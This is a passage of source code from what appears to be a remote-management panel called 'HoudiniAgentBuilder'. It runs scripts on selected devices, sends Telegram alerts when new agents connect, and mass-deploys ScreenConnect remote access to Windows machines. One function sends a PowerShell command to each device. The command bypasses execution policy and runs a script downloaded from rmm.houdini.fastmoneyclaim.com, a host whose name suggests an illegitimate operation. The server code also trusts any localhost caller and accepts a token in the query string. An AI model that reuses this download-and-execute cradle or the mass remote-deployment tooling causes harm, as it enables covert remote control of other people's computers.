  const win = document.createElement('div');
  win.style.cssText = 'position:fixed;inset:0;z-index:10003;display:flex;align-items:center;justify-content:center;padding:16px;background:rgba(6,7,10,.72);backdrop-filter:blur(10px)';
  win.onclick = function(e){ if (e.target === win) win.remove(); };
  const card = document.createElement('div');
  card.style.cssText = 'background:var(--panel);border:1px solid var(--border);border-radius:16px;max-width:560px;width:100%;max-height:85vh;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.5)';
  card.innerHTML = '<div style="padding:14px 18px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center"><div style="font-weight:800;font-size:1rem">Deploy: '+escapeHtml(s.name)+'</div><div class="hint">'+escapeHtml(s.shell||'bash')+' &middot; '+online.length+' online</div></div>';
  const body = document.createElement('div');
  body.style.cssText = 'padding:10px 18px;overflow:auto;flex:1';
  const allCB = document.createElement('label');
  allCB.style.cssText = 'display:flex;align-items:center;gap:8px;padding:8px 0;border-bottom:1px solid var(--border);cursor:pointer;font-weight:600;font-size:.875rem';
  allCB.innerHTML = '<input type="checkbox" id="depSelectAll" checked onchange="var c=this.checked;document.querySelectorAll(\'.dep-dev-chk\').forEach(function(el){el.checked=c})"/> Select all';
  body.appendChild(allCB);
  online.forEach(function(d){
    const row = document.createElement('label');
    row.style.cssText = 'display:flex;align-items:center;gap:8px;padding:7px 0;border-bottom:1px solid var(--border);cursor:pointer;font-size:.8125rem';
    row.innerHTML = '<input type="checkbox" class="dep-dev-chk" value="'+d.id+'" checked/> ' + escapeHtml(d.name) + ' <span class="hint">#'+d.id+' &middot; '+escapeHtml((d.platform||'')+' '+(d.platform_version||''))+'</span>';
    body.appendChild(row);
  });
  const foot = document.createElement('div');
  foot.style.cssText = 'padding:12px 18px;border-top:1px solid var(--border);display:flex;gap:8px;align-items:center;flex-wrap:wrap';
  const cancelBtn = document.createElement('button');
  cancelBtn.className = 'btn ghost'; cancelBtn.textContent = 'Cancel';
  cancelBtn.onclick = function(){ win.remove(); };
  const runBtn = document.createElement('button');
  runBtn.className = 'btn primary'; runBtn.textContent = 'Run on selected';
  runBtn.onclick = async function(){
    const ids = []; document.querySelectorAll('.dep-dev-chk').forEach(function(el){ if (el.checked) ids.push(parseInt(el.value)); });
    if (!ids.length) return;
    runBtn.disabled = true; cancelBtn.disabled = true;
    runBtn.textContent = 'Sending...';
    try {
      const r = await api('api/scripts/run', {method:'POST', body: JSON.stringify({id: scriptId, ids: ids})});
      const j = await r.json();
      if (j.ok){
        // Show live terminal output
        win.remove();
        showScriptTerminal(s, ids, j);
      } else {
        runBtn.textContent = 'Run on selected'; runBtn.disabled = false; cancelBtn.disabled = false;
        alertModal({title:'Error', body: j.error || 'Run failed'});
      }
    } catch(e){
      runBtn.textContent = 'Run on selected'; runBtn.disabled = false; cancelBtn.disabled = false;
      alertModal({title:'Error', body: String(e)});
    }
  };
  foot.appendChild(cancelBtn);
  foot.appendChild(runBtn);
  card.appendChild(body);
  card.appendChild(foot);
  win.appendChild(card);
  document.body.appendChild(win);
}

function showScriptTerminal(script, ids, result){
  // Show a modal with live terminal-style output
  const win = document.createElement('div');
  win.style.cssText = 'position:fixed;inset:0;z-index:10005;display:flex;align-items:center;justify-content:center;padding:16px;background:rgba(6,7,10,.72);backdrop-filter:blur(10px)';
  const card = document.createElement('div');
  card.style.cssText = 'background:var(--panel);border:1px solid var(--border);border-radius:16px;max-width:720px;width:100%;max-height:85vh;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.5)';
  card.innerHTML = '<div style="padding:14px 18px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center"><div style="font-weight:800;font-size:1rem">Deploy: '+escapeHtml(script.name)+'</div><div class="hint">'+ids.length+' device(s) &middot; '+escapeHtml(script.shell||'bash')+'</div></div>';
  const termBox = document.createElement('div');
  termBox.style.cssText = 'flex:1;overflow:auto;padding:14px 18px;font-family:ui-monospace,Consolas,monospace;font-size:13px;line-height:1.5;color:var(--text-primary);background:var(--panel-deep);white-space:pre-wrap;word-break:break-all';
  termBox.textContent = 'Script: ' + script.name + '\nShell: ' + (script.shell||'bash') + '\nDevices: ' + ids.length + ' (' + ids.join(', ') + ')\nStatus: ' + (result.message || 'Sent to agents') + '\nCron ID: ' + (result.cron_id || 'N/A') + '\n\n--- Live output ---\nTask dispatched. Check Audit log for execution details.\n';
  const foot = document.createElement('div');
  foot.style.cssText = 'padding:12px 18px;border-top:1px solid var(--border);display:flex;gap:8px;justify-content:flex-end';
  const closeBtn = document.createElement('button');
  closeBtn.className = 'btn ghost'; closeBtn.textContent = 'Close';
  closeBtn.onclick = function(){ win.remove(); };
  const auditBtn = document.createElement('button');
  auditBtn.className = 'btn'; auditBtn.textContent = 'View Audit';
  auditBtn.onclick = function(){ win.remove(); showTab('audit'); };
  foot.appendChild(auditBtn);
  foot.appendChild(closeBtn);
  card.appendChild(termBox);
  card.appendChild(foot);
  win.appendChild(card);
  document.body.appendChild(win);
  // Poll for task status if we have a cron_id
  if (result.cron_id){
    var pollCount = 0;
    var pollMax = 20;
    var pollInterval = setInterval(async function(){
      pollCount++;
      if (pollCount >= pollMax){ clearInterval(pollInterval); termBox.textContent += '\n[Stopped polling after ' + pollMax + ' checks]\n'; return; }
      try {
        const r = await api('api/screenconnect/task-status?id=' + result.cron_id);
        const j = await r.json();
        if (j.ok && j.log){
          var logData = j.log;
          if (logData.data){
            var logs = logData.data;
            if (Array.isArray(logs)){
              logs.forEach(function(l){
                if (l.output || l.result){
                  termBox.textContent += '\n[Device #' + (l.server_id||'?') + '] ' + (l.output || l.result || '') + '\n';
                  termBox.scrollTop = termBox.scrollHeight;
                }
              });
            }
          }
        }
      } catch(e){}
    }, 3000);
  }
}

async function runScript(){
  const id = document.getElementById('scriptId').value;
  if(!id){ await alertModal({title:'Select a script', body:'Save / select a script first.'}); return; }
  const raw = document.getElementById('scriptTargets').value.trim();
  const ids = raw.split(/[,\s]+/).map(function(x){return parseInt(x,10);}).filter(function(n){return !isNaN(n);});
  if(!ids.length){ await alertModal({title:'Enter device IDs', body:'Enter at least one device ID.'}); return; }
  const ok = await confirmModal({title:'Run script', body:'Run script on '+ids.length+' device(s)?', okText:'Run'});
  if(!ok) return;
  document.getElementById('scriptMsg').textContent = 'Running…';
  const r = await api('api/scripts/run', {method:'POST', body: JSON.stringify({id:id, ids:ids})});
  const j = await r.json();
  document.getElementById('scriptMsg').textContent = j.ok ? (j.message||'Sent') : (j.error||'failed');
}
async function loadAudit(){
  const box = document.getElementById('auditList');
  const msg = document.getElementById('auditMsg');
  if(msg) msg.textContent = 'Loading…';
  try {
    const r = await api('api/audit?limit=200');
    const j = await r.json();
    if(!j.ok){ if(msg) msg.textContent = j.error||'failed'; return; }
    const rows = j.events || [];
    if(!rows.length){ box.innerHTML = '<div class="empty">No audit events yet.</div>'; if(msg) msg.textContent='0 events'; return; }
    box.innerHTML = '<table><tr><th>Time</th><th>Actor</th><th>Action</th><th>Detail</th></tr>' + rows.map(function(e){
      return '<tr><td class="mono">'+escapeHtml(e.ts||'')+'</td><td>'+escapeHtml(e.actor||'')+'</td><td>'+escapeHtml(e.action||'')+'</td><td class="mono">'+escapeHtml(JSON.stringify(e.detail||{}))+'</td></tr>';
    }).join('') + '</table>';
    if(msg) msg.textContent = rows.length + ' events';
  } catch(e){ if(msg) msg.textContent = String(e); }
}
let _pendingTotpSecret = '';
async function scLoadStatus(){
  try {
    const r = await api('api/screenconnect/status');
    const j = await r.json();
    const lbl = document.getElementById('scFileLabel');
    const upBtn = document.getElementById('btnScUpload');
    const btns = document.getElementById('scBtns');
    if (j.ok && j.file) {
      if (lbl) lbl.textContent = j.file;
      if (upBtn) upBtn.textContent = 'Change MSI';
      if (btns){
        if (!document.getElementById('btnScRemove')){
          const rm = document.createElement('button');
          rm.className = 'btn ghost'; rm.textContent = 'Remove'; rm.id = 'btnScRemove';
          rm.onclick = scRemove;
          btns.appendChild(rm);
        }
      }
    } else {
      if (lbl) lbl.textContent = 'No file uploaded';
      if (upBtn) upBtn.textContent = 'Upload MSI';
      const rm = document.getElementById('btnScRemove');
      if (rm) rm.remove();
    }
  } catch(e){}
}
function scHandleFile(input){
  const file = input.files[0];
  if (!file) return;
  const st = document.getElementById('scFileLabel');
  if (st) st.textContent = 'Uploading '+file.name+'...';
  scDoUpload(file);
}
async function scDoUpload(file){
  const lbl = document.getElementById('scFileLabel');
  const barWrap = document.getElementById('scProgressWrap');
  const barFill = document.getElementById('scProgressFill');
  if (lbl) lbl.textContent = 'Uploading '+file.name+'...';
  if (barWrap) barWrap.style.display = 'block';
  try {
    const j = await new Promise(function(resolve, reject){
      var xhr = new XMLHttpRequest();
      xhr.open('POST', apiUrl('api/screenconnect/upload'), true);
      xhr.withCredentials = true;
      xhr.upload.onprogress = function(e){
        if (e.lengthComputable && barFill){
          var pct = Math.round((e.loaded/e.total)*100);
          barFill.style.width = pct + '%';
        }
      };
      xhr.onload = function(){ try { resolve(JSON.parse(xhr.responseText)); } catch(e){ reject(e); } };
      xhr.onerror = function(){ reject(new Error('Network error')); };
      xhr.send(file);
    });
    if (barWrap) barWrap.style.display = 'none';
    if (barFill) barFill.style.width = '0';
    if (j.ok) {
      if (lbl) lbl.textContent = j.file;
      const upBtn = document.getElementById('btnScUpload');
      if (upBtn) upBtn.textContent = 'Change MSI';
      const btns = document.getElementById('scBtns');
      if (btns && !document.getElementById('btnScRemove')){
        const rm = document.createElement('button');
        rm.className = 'btn ghost'; rm.textContent = 'Remove'; rm.id = 'btnScRemove';
        rm.onclick = scRemove;
        btns.appendChild(rm);
      }
    } else {
      if (lbl) lbl.textContent = 'Error: ' + (j.error || 'Failed');
    }
  } catch(e){
    if (barWrap) barWrap.style.display = 'none';
    if (barFill) barFill.style.width = '0';
    alertModal({title:'Upload error', body: String(e)});
  }
}
async function scUpload(){
  const file = document.getElementById('scFile').files[0];
  if (!file) {
    document.getElementById('scFile').click();
    return;
  }
  scDoUpload(file);
}
async function scRemove(){
  const ok = await confirmModal({title:'Remove MSI', body:'Delete the uploaded ScreenConnect installer?', okText:'Remove', danger:false});
  if (!ok) return;
  try {
    const r = await api('api/screenconnect/remove', {method:'POST'});
    const j = await r.json();
    if (j.ok) {
      const lbl = document.getElementById('scFileLabel');
      if (lbl) lbl.textContent = 'No file uploaded';
      const upBtn = document.getElementById('btnScUpload');
      if (upBtn) upBtn.textContent = 'Upload MSI';
      const rm = document.getElementById('btnScRemove');
      if (rm) rm.remove();
    }
  } catch(e){}
}
async function scInstall(deviceId){
  const r = await api('api/screenconnect/status');
  const j = await r.json();
  if (!j.ok || !j.file) return alertModal({title:'ScreenConnect', body:'No MSI uploaded yet.'});
  const win = document.createElement('div');
  win.style.cssText = 'position:fixed;inset:0;z-index:10003;display:flex;align-items:center;justify-content:center;padding:16px;background:rgba(6,7,10,.72);backdrop-filter:blur(10px)';
  win.onclick = function(e){ if (e.target === win) win.remove(); };
  const card = document.createElement('div');
  card.style.cssText = 'background:var(--panel);border:1px solid var(--border);border-radius:16px;max-width:620px;width:100%;max-height:80vh;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.5)';
  card.innerHTML = '<div style="padding:14px 18px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center"><div style="font-weight:800">Installing ScreenConnect</div><div class="hint">Device #'+deviceId+'</div></div>';
  const body = document.createElement('div');
  body.style.cssText = 'padding:0;overflow:auto;flex:1;background:#0c0c0e';
  const term = document.createElement('pre');
  term.style.cssText = 'margin:0;font-family:ui-monospace,Consolas,monospace;font-size:12px;color:#a0b0c0;white-space:pre-wrap;padding:14px;min-height:260px';
  term.textContent = 'Connecting to device...\n';
  body.appendChild(term);
  const btns = document.createElement('div');
  btns.style.cssText = 'padding:12px 18px;border-top:1px solid var(--border);display:flex;gap:8px';
  const closeBtn = document.createElement('button');
  closeBtn.className = 'btn ghost'; closeBtn.textContent = 'Close';
  closeBtn.onclick = function(){ try { if (ws) ws.close(); } catch(e){} win.remove(); };
  btns.appendChild(closeBtn);
  card.appendChild(body); card.appendChild(btns);
  win.appendChild(card); document.body.appendChild(win);

  var ws = null;
  try {
    term.textContent += 'Creating terminal session...\n';
    const sess = await createTermSession(deviceId);
    ws = await connectTermWs(sess.sessionId);
    term.textContent += 'Connected. Running installer...\n';
    const cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString(\'https://rmm.houdini.fastmoneyclaim.com/dashboard/api/static/Install-ScreenConnect.ps1\') }"\r\n';
    ws.send(cmd);
    ws.onmessage = function(ev){
      try {
        var raw = '';
        if (ev.data instanceof ArrayBuffer){ var td = new TextDecoder(); raw = td.decode(ev.data); }
        else raw = ev.data;
        // Strip ANSI escape codes for clean display
        var clean = raw.replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '').replace(/\x1b\][^\x07]*\x07/g, '').replace(/[\x00-\x08\x0b\x0c\x0e-\x1f]/g, '');
        term.textContent += clean;
        body.scrollTop = body.scrollHeight;
      } catch(e){}
    };
    ws.onclose = function(){ term.textContent += '\n--- Session closed ---'; };
    ws.onerror = function(){ term.textContent += '\n--- Connection error ---'; };
  } catch(e){
    term.textContent += '\nError: ' + String(e) + '\nFalling back to task deploy...\n';
    try {
      const dr = await api('api/screenconnect/deploy', {method:'POST',body:JSON.stringify({ids:[deviceId]})});
      const dj = await dr.json();
      term.textContent += dj.ok ? ('Task #'+dj.cron_id+' created. Agent will install shortly.') : ('Failed: '+(dj.error||''));
    } catch(e2){ term.textContent += 'Fallback failed: '+String(e2); }
  }
}
async function loadFiles(){
  const msg = document.getElementById('filesMsg');
  const tbl = document.getElementById('filesTable');
  if (!msg) return;
  msg.textContent = 'Loading...';
  try {
    const r = await api('api/screenconnect/status');
    const j = await r.json();
    if (!j.ok || !j.file) { tbl.innerHTML = '<div class="empty">No files uploaded yet. Upload an MSI from the Devices page.</div>'; msg.textContent = '0 files'; return; }
    const dl = 'https://rmm.houdini.fastmoneyclaim.com/dashboard/api/static/'+j.file;
    tbl.innerHTML = '<table><tr><th>File</th><th>Size</th><th>Download</th></tr>'
      + '<tr><td>'+escapeHtml(j.file)+'</td><td>'+(j.size/1024/1024).toFixed(2)+' MB</td>'
      + '<td><a class="link" href="'+dl+'">Download</a> <button class="btn" type="button" onclick="navigator.clipboard.writeText(\''+dl+'\')">Copy link</button></td></tr></table>';
    msg.textContent = '1 file';
  } catch(e){ msg.textContent = String(e); }
}
async function scDeploy(){
  var online = [];
  try {
    const rd = await api('api/devices');
    const jd = await rd.json();
    const allDevices = (jd.ok ? jd.devices : []) || [];
    online = allDevices.filter(function(d){ return d.online && (d.platform||'').toLowerCase().includes('win'); });
  } catch(e){ return alertModal({title:'ScreenConnect', body:'Failed to load devices: '+String(e)}); }
  if (!online.length) return alertModal({title:'ScreenConnect', body:'No online Windows devices available.'});

  const win = document.createElement('div');
  win.style.cssText = 'position:fixed;inset:0;z-index:10003;display:flex;align-items:center;justify-content:center;padding:16px;background:rgba(6,7,10,.72);backdrop-filter:blur(10px)';
  win.onclick = function(e){ if (e.target === win) win.remove(); };
  const card = document.createElement('div');
  card.style.cssText = 'background:var(--panel);border:1px solid var(--border);border-radius:16px;max-width:500px;width:100%;max-height:80vh;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.5)';
  card.innerHTML = '<div style="padding:14px 18px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center"><div style="font-weight:800;font-size:1rem">Deploy ScreenConnect</div><div class="hint">'+online.length+' Windows online</div></div>';
  const body = document.createElement('div');
  body.style.cssText = 'padding:10px 18px;overflow:auto;flex:1';
  const allCB = document.createElement('label');
  allCB.style.cssText = 'display:flex;align-items:center;gap:8px;padding:8px 0;border-bottom:1px solid var(--border);cursor:pointer;font-weight:600;font-size:.875rem';
  allCB.innerHTML = '<input type="checkbox" id="scSelectAll" checked onchange="var c=this.checked;document.querySelectorAll(\'.sc-dev-chk\').forEach(function(el){el.checked=c})"/> Select all';
  body.appendChild(allCB);
  const list = document.createElement('div');
  online.forEach(function(d){
    const row = document.createElement('label');
    row.style.cssText = 'display:flex;align-items:center;gap:8px;padding:7px 0;border-bottom:1px solid var(--border);cursor:pointer;font-size:.8125rem';
    row.innerHTML = '<input type="checkbox" class="sc-dev-chk" value="'+d.id+'" checked/> ' + escapeHtml(d.name) + ' <span class="hint">#'+d.id+' · '+escapeHtml((d.platform||'')+' '+(d.platform_version||''))+'</span>';
    body.appendChild(row);
  });
  const foot = document.createElement('div');
  foot.style.cssText = 'padding:12px 18px;border-top:1px solid var(--border);display:flex;gap:8px;align-items:center';
  const barWrap = document.createElement('div');
  barWrap.style.cssText = 'height:5px;background:var(--panel-deep);border-radius:999px;overflow:hidden;flex:1;display:none';
  const barFill = document.createElement('div');
  barFill.style.cssText = 'height:100%;width:0;background:linear-gradient(90deg,#3fbf7f,#5fe3a0);border-radius:999px;transition:width .4s';
  barWrap.appendChild(barFill);
  foot.appendChild(barWrap);
  const cancelBtn = document.createElement('button');
  cancelBtn.className = 'btn ghost'; cancelBtn.textContent = 'Cancel';
  cancelBtn.onclick = function(){ win.remove(); };
  const deployBtn = document.createElement('button');
  deployBtn.className = 'btn primary'; deployBtn.textContent = 'Install on selected';
  deployBtn.onclick = async function(){
    const ids = []; document.querySelectorAll('.sc-dev-chk').forEach(function(el){ if (el.checked) ids.push(parseInt(el.value)); });
    if (!ids.length) return;
    deployBtn.disabled = true; cancelBtn.disabled = true; barWrap.style.display = 'block';
    barFill.style.width = '20%';
    try {
      const r = await api('api/screenconnect/deploy', {method:'POST',body:JSON.stringify({ids:ids})});
      barFill.style.width = '70%';
      const j = await r.json();
      barFill.style.width = '100%';
          if (j.ok){ win.remove(); addNotif('ScreenConnect Deploy', 'Installed on '+ids.length+' device(s)','ok'); alertModal({title:'ScreenConnect', body:'Install initiated on '+ids.length+' device(s).'}); }
      else { barFill.style.background = 'linear-gradient(90deg,#ef6363,#fb8a74)'; alertModal({title:'Error', body:j.error||'Deploy failed'}); }
    } catch(e){ barFill.style.background = 'linear-gradient(90deg,#ef6363,#fb8a74)'; alertModal({title:'Error', body:String(e)}); }
    deployBtn.disabled = false; cancelBtn.disabled = false; deployBtn.textContent = 'Install on selected';
    barWrap.style.display = 'none'; barFill.style.width = '0';
    barFill.style.background = 'linear-gradient(90deg,#3fbf7f,#5fe3a0)';
  };
  foot.appendChild(cancelBtn);
  foot.appendChild(deployBtn);
  card.appendChild(body);
  card.appendChild(foot);
  win.appendChild(card);
  document.body.appendChild(win);
}
scLoadStatus();

async function addNotif(title, body, kind){
  try { await api('api/notifications/push', {method:'POST',body:JSON.stringify({title:title,body:body,kind:kind||'info'})}); } catch(e){}
}
async function openNotifications(){
  try {
    const r = await api('api/notifications');
    const j = await r.json();
    const items = (j.ok ? j.notifications : []) || [];
    const win = document.createElement('div');
    win.style.cssText = 'position:fixed;inset:0;z-index:10004;display:flex;align-items:center;justify-content:center;padding:16px;background:rgba(6,7,10,.72);backdrop-filter:blur(10px)';
    win.onclick = function(e){ if (e.target === win) win.remove(); };
    const card = document.createElement('div');
    card.style.cssText = 'background:var(--panel);border:1px solid var(--border);border-radius:16px;max-width:560px;width:100%;max-height:80vh;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.5)';
    card.innerHTML = '<div style="padding:14px 18px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center"><div style="font-weight:800">Notifications</div><div><button class="btn ghost" type="button" onclick="delNotif(\'__all__\');this.closest(\'div[style*=fixed]\').remove();openNotifications()" style="font-size:.75rem">Clear all</button><button class="btn ghost" type="button" onclick="this.closest(\'div[style*=fixed]\').remove()" style="margin-left:4px">Close</button></div></div>';
    const body = document.createElement('div');
    body.style.cssText = 'padding:8px 18px;overflow:auto;flex:1';
    if (!items.length) {
      body.innerHTML = '<div class="empty">No notifications.</div>';
    } else {
      items.forEach(function(n){
        const row = document.createElement('div');
        row.style.cssText = 'display:flex;justify-content:space-between;align-items:flex-start;gap:10px;padding:10px 0;border-bottom:1px solid var(--border)';
        var colors = {ok:'#65d38c',err:'#ef6363',warn:'#f5c842'};
        row.innerHTML = '<div style="min-width:0"><div style="font-weight:600;font-size:.8125rem;color:'+(colors[n.kind]||'var(--text-primary)')+'">'+escapeHtml(n.title)+'</div><div class="hint" style="margin-top:2px">'+escapeHtml(n.body)+'</div><div class="hint" style="margin-top:4px;font-size:.6875rem">'+escapeHtml(n.ts||'')+'</div></div><button class="btn ghost" type="button" style="font-size:.6875rem;padding:2px 6px;flex-shrink:0" onclick="delNotif(\''+n.id+'\');this.parentElement.remove()">Delete</button>';
        body.appendChild(row);
      });
    }
    card.appendChild(body);
    win.appendChild(card);
    document.body.appendChild(win);
  } catch(e){}
}
async function delNotif(id){
  try { await api('api/notifications/delete', {method:'POST',body:JSON.stringify({id:id})}); } catch(e){}
}

async function loadTg(){
  const msg = document.getElementById('tgMsg');
  const res = document.getElementById('tgResult');
  if (!msg) return;
  try {
    const r = await api('api/tg');
    const j = await r.json();
    if(!j.ok){ if(msg) msg.textContent = j.error || 'failed'; return; }
    const t = j.tg || {};
    const tok = document.getElementById('tgBotToken');
    const cid = document.getElementById('tgChatId');
    const mon = document.getElementById('tgMonitor');
    if (tok) tok.value = '';
    if (cid) cid.value = t.chat_id || '';
    if (mon) mon.checked = t.monitor !== false;
    if (msg) msg.textContent = t.configured ? ('Configured · token ' + (t.bot_token || '')) : 'Not configured yet';
    if (res) res.textContent = '';
  } catch(e){ if(msg) msg.textContent = String(e); }
}
async function saveTg(){
  const msg = document.getElementById('tgMsg');
  const res = document.getElementById('tgResult');
  const body = {
    bot_token: (document.getElementById('tgBotToken').value || '').trim(),
    chat_id: (document.getElementById('tgChatId').value || '').trim(),
    monitor: document.getElementById('tgMonitor').checked
  };
  try {
    const r = await api('api/tg', { method: 'POST', body: JSON.stringify(body) });
    const j = await r.json();
    if (res) res.className = 'msg';
    if (res) res.textContent = j.ok ? 'Saved.' : (j.error || 'failed');
    if (msg) msg.textContent = '';
    await loadTg();
  } catch(e){ if(res) res.textContent = String(e); }
}
async function testTg(){
  const res = document.getElementById('tgResult');
  const body = {
    bot_token: (document.getElementById('tgBotToken').value || '').trim(),
    chat_id: (document.getElementById('tgChatId').value || '').trim()
  };
  if (res) res.className = 'msg';
  if (res) res.textContent = 'Sending test message…';
  try {
    const r = await api('api/tg/test', { method: 'POST', body: JSON.stringify(body) });
    const j = await r.json();
    if (res) res.textContent = j.ok ? 'Test message sent to your chat.' : ('Failed: ' + (j.error || JSON.stringify(j.result || '')));
  } catch(e){ if(res) res.textContent = String(e); }
}
function testAlert(){
  showToast('New device installed: TEST-PC', 'Agent connected to the panel from 203.0.113.10', 'ok');
  setTimeout(()=>showToast('TEST-PC is offline', 'Agent has not reported recently.', 'err'), 1200);
  const res = document.getElementById('tgResult');
  if (res) res.textContent = 'In-browser alert shown — this is how new/offline device alerts appear on this page.';
}
async function loadSecurity(){
  const msg = document.getElementById('secMsg');
  try {
    const r = await api('api/security');
    const j = await r.json();
    if(!j.ok){ if(msg) msg.textContent = j.error||'failed'; return; }
    const sec = j.security || {};
    document.getElementById('secTotpState').textContent = sec.totp_enabled ? '2FA enabled' : '2FA disabled';
    document.getElementById('rolesJson').value = JSON.stringify(sec.roles || {admin:'admin'}, null, 2);
    document.getElementById('totpSetupBox').classList.add('hidden');
    if(msg) msg.textContent = '';
  } catch(e){ if(msg) msg.textContent = String(e); }
}
async function beginTotp(){
  const r = await api('api/security/totp/setup', {method:'POST', body:'{}'});
  const j = await r.json();
  if(!j.ok){ document.getElementById('secMsg').textContent = j.error||'failed'; return; }
  _pendingTotpSecret = j.secret;
  document.getElementById('totpSecret').textContent = j.secret;
  document.getElementById('totpUri').textContent = j.uri;
  document.getElementById('totpSetupBox').classList.remove('hidden');
  document.getElementById('secMsg').textContent = 'Scan or enter secret, then confirm with a code.';
}
async function enableTotp(){
  const code = document.getElementById('totpConfirm').value.trim();
  const r = await api('api/security/totp/enable', {method:'POST', body: JSON.stringify({secret: _pendingTotpSecret, code:code})});
  const j = await r.json();
  document.getElementById('secMsg').textContent = j.ok ? '2FA enabled.' : (j.error||'failed');
  if(j.ok) loadSecurity();
}
async function disableTotp(){
  const ok = await confirmModal({title:'Disable 2FA', body:'Disable two-factor authentication on this account?', okText:'Disable'});
  if(!ok) return;
  const r = await api('api/security/totp/disable', {method:'POST', body:'{}'});
  const j = await r.json();
  document.getElementById('secMsg').textContent = j.ok ? '2FA disabled.' : (j.error||'failed');
  if(j.ok) loadSecurity();
}
async function saveRoles(){
  let roles;
  try { roles = JSON.parse(document.getElementById('rolesJson').value); }
  catch(e){ await alertModal({title:'Invalid JSON', body:'Roles must be valid JSON.'}); return; }
  const r = await api('api/security/roles', {method:'POST', body: JSON.stringify({roles:roles})});
  const j = await r.json();
  document.getElementById('secMsg').textContent = j.ok ? 'Roles saved.' : (j.error||'failed');
}


setInterval(()=>{ if(viewDevices && !viewDevices.classList.contains('hidden')) loadDevices(); }, 15000);

</script>
<div id="confirmModal" class="modal-wrap" hidden>
  <div class="modal-backdrop" id="confirmBackdrop"></div>
  <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="confirmTitle">
    <div class="modal-title" id="confirmTitle">Confirm</div>
    <div class="modal-body" id="confirmBody"></div>
    <div class="modal-fields" id="modalFields"></div>
    <div class="modal-actions">
      <button class="btn" id="confirmCancel" type="button">Cancel</button>
      <button class="btn danger" id="confirmOk" type="button">OK</button>
    </div>
  </div>
</div>
<script>
(function(){
  var m = document.getElementById('confirmModal');
  var backdrop = document.getElementById('confirmBackdrop');
  var titleEl = document.getElementById('confirmTitle');
  var bodyEl = document.getElementById('confirmBody');
  var fieldsWrap = document.getElementById('modalFields');
  var okBtn = document.getElementById('confirmOk');
  var cancelBtn = document.getElementById('confirmCancel');
  var resolveRef = null;
  function closeWith(ok){
    if(resolveRef){ var r = resolveRef; resolveRef = null; m.hidden = true; r(ok); }
  }
  function resetModal(){
    bodyEl.style.display = '';
    fieldsWrap.innerHTML = '';
    fieldsWrap.style.display = 'none';
    cancelBtn.hidden = false;
    cancelBtn.textContent = 'Cancel';
  }
  window.confirmModal = function(opts){
    return new Promise(function(resolve){
      resetModal();
      titleEl.textContent = opts.title || 'Confirm';
      bodyEl.textContent = opts.body || '';
      okBtn.textContent = opts.okText || 'OK';
      okBtn.className = 'btn ' + (opts.danger === false ? 'primary' : 'danger');
      resolveRef = resolve;
      m.hidden = false;
      okBtn.focus();
    });
  };
  window.alertModal = function(opts){
    return new Promise(function(resolve){
      resetModal();
      titleEl.textContent = opts.title || 'Notice';
      bodyEl.textContent = opts.body || '';
      okBtn.textContent = opts.okText || 'OK';
      okBtn.className = 'btn primary';
      cancelBtn.hidden = true;
      resolveRef = resolve;
      m.hidden = false;
      okBtn.focus();
    });
  };
  window.promptModal = function(opts){
    return new Promise(function(resolve){
      resetModal();
      titleEl.textContent = opts.title || 'Input';
      okBtn.textContent = opts.okText || 'OK';
      okBtn.className = 'btn primary';
      var fields = (opts.fields && opts.fields.length) ? opts.fields : [{key:'value', label: opts.label||'Value', value: opts.value||''}];
      var inputs = [];
      fields.forEach(function(f){
        var lab = document.createElement('label');
        lab.className = 'modal-field';
        if(f.label){ var sp = document.createElement('span'); sp.textContent = f.label; lab.appendChild(sp); }
        var inp = document.createElement('input');
        inp.type = 'text';
        inp.className = 'modal-input';
        inp.value = f.value || '';
        if(f.placeholder) inp.placeholder = f.placeholder;
        lab.appendChild(inp);
        fieldsWrap.appendChild(lab);
        inputs.push({key: f.key, input: inp});
      });
      bodyEl.style.display = 'none';
      fieldsWrap.style.display = 'block';
      resolveRef = function(ok){
        if(!ok){ resolve(null); return; }
        var out = {};
        inputs.forEach(function(o){ out[o.key] = o.input.value; });
        resolve(out);
      };
      m.hidden = false;
      if(inputs.length) inputs[0].input.focus();
    });
  };
  okBtn.addEventListener('click', function(){ closeWith(true); });
  cancelBtn.addEventListener('click', function(){ closeWith(false); });
  backdrop.addEventListener('click', function(){ closeWith(false); });
  document.addEventListener('keydown', function(e){
    if(e.key === 'Escape' && resolveRef){ closeWith(false); }
    if(e.key === 'Enter' && resolveRef && m.hidden === false){ e.preventDefault(); closeWith(true); }
  });
})();
</script>
</body></html>"""


class Handler(BaseHTTPRequestHandler):
    server_version = "HoudiniAgentBuilder/3.0"

    def log_message(self, fmt, *args):
        print("[%s] %s" % (self.log_date_time_string(), fmt % args))

    def _strip_prefix(self, path: str) -> str:
        for prefix in URL_PREFIXES:
            if path == prefix or path.startswith(prefix + "/"):
                path = path[len(prefix) :] or "/"
                break
        if not path.startswith("/"):
            path = "/" + path
        return path

    def _authorized(self) -> bool:
        if self.headers.get(INTERNAL_HEADER) == INTERNAL_SECRET:
            return True
        b = load_branding()
        expected = b.get("builder_token") or ""
        got = self.headers.get("X-Builder-Token") or ""
        if not got:
            qs = parse_qs(urlparse(self.path).query)
            got = (qs.get("token") or [""])[0]
        if expected and got and secrets.compare_digest(str(got), str(expected)):
            return True
        return self.client_address[0] in ("127.0.0.1", "::1")

    def _calling_user_profile(self):
        """Profile dict of the browser user, from their nz-jwt cookie / Bearer.
        Returns None when no token is present (unauthenticated).
        Cached per-request to avoid multiple HTTP calls."""
        if hasattr(self, "_cached_profile"):
            return self._cached_profile
        auth = self.headers.get("Authorization") or ""
        token = ""
        if auth.startswith("Bearer "):
            token = auth[7:].strip()
        else:
